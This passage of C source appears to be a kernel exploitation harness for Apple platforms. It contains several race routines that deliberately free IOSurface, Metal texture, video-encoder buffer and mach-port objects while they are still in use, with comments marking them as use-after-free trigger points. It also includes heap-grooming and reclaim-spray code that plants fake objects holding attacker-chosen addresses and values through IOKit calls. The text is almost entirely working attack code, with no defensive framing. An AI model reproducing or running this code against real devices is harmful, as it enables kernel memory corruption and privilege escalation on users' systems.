    /* Create IOSurface props for 128x128 BGRA */
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 128, h = 128, bpe = 4, bpr = w * bpe;
    int pf = 0x42475241;
    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef rn_cf = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn_cf);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);

    /* texture2DDescriptor for MTLPixelFormatBGRA8Unorm (80) */
    typedef void *(*msgSend4_t)(void *, void *, unsigned long, unsigned long, unsigned long, int);
    msgSend4_t msgSend4 = (msgSend4_t)dlsym(objc_lib, "objc_msgSend");
    void *texDesc = msgSend4(MTLTexDesc, tex2dSel, 80, (unsigned long)w, (unsigned long)h, 0);

    while (r256_run) {
        IOSurfaceRef surf = IOSurfaceCreate(props);
        if (!surf) continue;

        /* Create Metal texture backed by this IOSurface */
        typedef void *(*msgSendTex_t)(void *, void *, void *, void *, unsigned long, unsigned long);
        msgSendTex_t msgSendTex = (msgSendTex_t)dlsym(objc_lib, "objc_msgSend");
        void *texture = msgSendTex(device, newTexSel, texDesc, surf, 0, 0);

        if (texture) {
            /* Create command buffer and blit encoder — this submits GPU work */
            void *cmdBuf = msgSend(cmdQueue, newCmdBuf);
            if (cmdBuf) {
                void *encoder = msgSend(cmdBuf, newBlitEnc);
                if (encoder) {
                    /* The blit encoder references the texture → GPU will DMA from IOSurface */
                    msgSend(encoder, endEncoding);
                }
                msgSend(cmdBuf, commitSel);
                __sync_fetch_and_add(&r256_submitted, 1);

                /* CRITICAL: Free IOSurface NOW while GPU may be accessing it */
                CFRelease(surf);
                __sync_fetch_and_add(&r256_freed, 1);

                /* Release Metal objects — texture still references the freed IOSurface */
                msgSend(texture, releaseSel);
                /* Don't release cmdBuf — it's autoreleased */
            } else {
                CFRelease(surf);
            }
        } else {
            CFRelease(surf);
        }
        if (r256_submitted % 32 == 0) sched_yield();
    }

    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn_cf); CFRelease(pfn);
    CFRelease(props);
    dlclose(metal_lib);
    dlclose(objc_lib);
    return NULL;
}

/* r255: mach port race UAF — create IOSurface, get port, free surface, race port dealloc */
static volatile int r255_run = 0;
static volatile int r255_created = 0;
static volatile int r255_lookup_ok = 0;
static volatile int r255_lookup_fail = 0;
static volatile int r255_uaf_check = 0;

struct r255_slot {
    volatile mach_port_t port;
    volatile IOSurfaceID sid;
    volatile int state; /* 0=empty, 1=port_ready, 2=freed */
};
#define R255_SLOTS 64
static struct r255_slot r255_slots[R255_SLOTS];

static void *r255_producer(void *arg) {
    (void)arg;
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 64, h = 64, bpe = 4, bpr = w * bpe;
    int pf = 0x42475241;
    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);

    int idx = 0;
    while (r255_run) {
        struct r255_slot *s = &r255_slots[idx % R255_SLOTS];
        if (s->state != 0) { idx++; sched_yield(); continue; }

        IOSurfaceRef surf = IOSurfaceCreate(props);
        if (!surf) continue;
        IOSurfaceID sid = IOSurfaceGetID(surf);
        mach_port_t port = IOSurfaceCreateMachPort(surf);
        /* Release the userspace IOSurface ref — kernel still holds via mach port */
        CFRelease(surf);
        __sync_fetch_and_add(&r255_created, 1);

        s->port = port;
        s->sid = sid;
        __sync_synchronize();
        s->state = 1; /* Signal consumers */
        idx++;
    }
    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
    CFRelease(props);
    return NULL;
}

static void *r255_consumer(void *arg) {
    int tid = (int)(uintptr_t)arg;
    int idx = tid; /* Start at different offsets */
    while (r255_run) {
        struct r255_slot *s = &r255_slots[idx % R255_SLOTS];
        if (s->state != 1) { idx += 2; sched_yield(); continue; }

        mach_port_t port = s->port;
        /* Race: lookup from port while another thread may be deallocating it */
        IOSurfaceRef found = IOSurfaceLookupFromMachPort(port);
        if (found) {
            /* Access the surface to force kernel to dereference internal fields */
            IOSurfaceGetWidth(found);
            IOSurfaceGetAllocSize(found);
            IOSurfaceIsInUse(found);
            __sync_fetch_and_add(&r255_lookup_ok, 1);
            CFRelease(found);
        } else {
            __sync_fetch_and_add(&r255_lookup_fail, 1);
        }
        idx += 2;
    }
    return NULL;
}

static void *r255_destroyer(void *arg) {
    (void)arg;
    int idx = 0;
    while (r255_run) {
        struct r255_slot *s = &r255_slots[idx % R255_SLOTS];
        if (s->state != 1) { idx++; sched_yield(); continue; }

        mach_port_t port = s->port;
        s->state = 2;
        /* Deallocate the mach port — drops kernel IOSurface ref.
           If a consumer is mid-lookup, the kernel may access freed memory. */
        mach_port_deallocate(mach_task_self(), port);
        __sync_fetch_and_add(&r255_uaf_check, 1);
        /* Mark slot as reusable */
        s->state = 0;
        idx++;
    }
    return NULL;
}

/* r254: encode-and-release UAF — push frames through hardware encoder, free immediately */
static volatile int r254_run = 0;
static volatile int r254_submitted = 0;
static volatile int r254_freed = 0;
static volatile int r254_cb_count = 0;

static void r254_encode_cb(void *ctx, void *src, OSStatus status,
                            VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    (void)ctx; (void)src; (void)status; (void)flags; (void)buf;
    __sync_fetch_and_add(&r254_cb_count, 1);
}

static void *r254_encode_loop(void *arg) {
    int tid = (int)(uintptr_t)arg;
    /* Create a simple HEVC encoder — hardware accelerated */
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

    int w = 192, h = 192;
    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        r254_encode_cb, NULL, &session);
    CFRelease(enc_spec);
    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
    int kf = 30;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session); CFRelease(session);
        return NULL;
    }

    int frame_idx = tid * 1000000;
    while (r254_run) {
        /* Create IOSurface-backed pixel buffer */
        CVPixelBufferRef pb = NULL;
        CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
        CVReturn cr = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
        CFRelease(iosurf); CFRelease(attrs);
        if (cr != kCVReturnSuccess || !pb) continue;

        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, frame_idx & 0xFF, w * h * 4);
        CVPixelBufferUnlockBaseAddress(pb, 0);

        CMTime pts = CMTimeMake(frame_idx, 30);
        CMTime dur = CMTimeMake(1, 30);
        st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st == noErr) {
            __sync_fetch_and_add(&r254_submitted, 1);
        }
        /* CRITICAL: Release pixel buffer immediately — encoder still holds kernel IOSurface ref */
        CVPixelBufferRelease(pb);
        __sync_fetch_and_add(&r254_freed, 1);
        frame_idx++;

        /* Occasionally yield to let encoder process and hit the race */
        if (frame_idx % 16 == 0) sched_yield();
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    return NULL;
}

/* r253: aggressive render loops — per-thread frame counters, no sleep, varied sizes */
static volatile int r253_render_run = 0;
static volatile int r253_frames[4] = {0,0,0,0};

static void *r253_render_fn(void *arg) {
    int tid = (int)(uintptr_t)arg;
    /* Each thread uses a different surface size to hit different zone sub-buckets */
    static const int sizes[][2] = {{64,64},{128,128},{256,64},{32,256}};
    int w = sizes[tid % 4][0], h = sizes[tid % 4][1];
    int bpe = 4, bpr = w * bpe;

    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
    if (metal_lib) {
        typedef void *(*MTLCreateDev_t)(void);
        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
        if (createDev) createDev();
    }

    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    int pf = 0x42475241;
    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);

    int batch = 0;
    while (r253_render_run) {
        /* Create a small batch, hold them briefly, then release — widens async window */
        IOSurfaceRef surfs[4];
        CVPixelBufferRef pbs[4];
        int n = 0;
        for (int i = 0; i < 4 && r253_render_run; i++) {
            surfs[i] = IOSurfaceCreate(props);
            pbs[i] = NULL;
            if (surfs[i]) {
                CVPixelBufferCreateWithIOSurface(NULL, surfs[i], NULL, &pbs[i]);
                n++;
            }
        }
        /* Release pixel buffers first — compositor may still hold IOSurface ref */
        for (int i = 0; i < n; i++) {
            if (pbs[i]) CFRelease(pbs[i]);
        }
        /* Tiny delay to let compositor start processing before surface freed */
        if (batch % 3 == 0) usleep(500);
        /* Free IOSurfaces — this is the UAF trigger point */
        for (int i = 0; i < n; i++) {
            if (surfs[i]) CFRelease(surfs[i]);
        }
        r253_frames[tid] += n;
        batch++;
        /* Every 8th batch, yield to let other threads and the compositor run */
        if (batch % 8 == 0) sched_yield();
    }
    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
    CFRelease(props);
    if (metal_lib) dlclose(metal_lib);
    return NULL;
}

/* Phase 13 groom state */
static io_connect_t p13_groom_conn = IO_OBJECT_NULL;
static mach_port_t p13_groom_wps[512];
static int p13_groom_n = 0;

static void p13_free_groom(void) {
    for (int i = 0; i < p13_groom_n; i++)
        mach_port_deallocate(mach_task_self(), p13_groom_wps[i]);
    p13_groom_n = 0;
}

static void p13_groom_fake(uint64_t addr, uint64_t val, int inSz) {
    p13_free_groom();
    if (!p13_groom_conn) return;
    uint8_t fbuf[64];
    memset(fbuf, 0, sizeof(fbuf));
    uint64_t *f = (uint64_t *)fbuf;
    f[0] = 0x21;
    f[1] = 0x1122334455667788ULL;
    f[2] = addr;
    f[3] = val;
    f[4] = 0x4141414141414141ULL;
    f[5] = 0x43414E415259ULL;
    uint64_t ref = 0xA1B2C3D4E5F60708ULL;
    if (inSz <= 0 || inSz > 64) inSz = 24;
    for (int i = 0; i < 512; i++) {
        mach_port_t wp = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
        kern_return_t r = IOConnectCallAsyncMethod(p13_groom_conn, 1000, wp, &ref, 1,
            NULL, 0, fbuf, inSz, NULL, NULL, NULL, NULL);
        if (r == 0 || r == (kern_return_t)0xE00002C2) {
            p13_groom_wps[p13_groom_n++] = wp;
        } else {
            mach_port_deallocate(mach_task_self(), wp);
        }
    }
}

/* r=225 reclaim spray — fills freed GEN2 entries via sel17 on fresh connections */
#define P13_RECLAIM_MAX 640
static io_connect_t p13_reclaim_conns[P13_RECLAIM_MAX];
static int p13_reclaim_n = 0;
static io_service_t p13_reclaim_svc = IO_OBJECT_NULL;

static void p13_free_reclaim(void) {
    for (int i = 0; i < p13_reclaim_n; i++)
        if (p13_reclaim_conns[i]) IOServiceClose(p13_reclaim_conns[i]);
    p13_reclaim_n = 0;
}

static int p13_reclaim_spray(int count, uint64_t tag) {
    if (!p13_reclaim_svc) return 0;
    uint64_t inp[3] = {1, 2, 3};
    int added = 0;
    for (int i = 0; i < count && p13_reclaim_n < P13_RECLAIM_MAX; i++) {
        io_connect_t c = IO_OBJECT_NULL;
        if (IOServiceOpen(p13_reclaim_svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        mach_port_t wp = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
        uint64_t ref = tag | i;
        kern_return_t kr = IOConnectCallAsyncMethod(c, 17, wp, &ref, 1,
            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
        mach_port_deallocate(mach_task_self(), wp);
        if (kr == KERN_SUCCESS) {
            p13_reclaim_conns[p13_reclaim_n++] = c;
            added++;
        } else {
            IOServiceClose(c);
        }
    }
    return added;
}

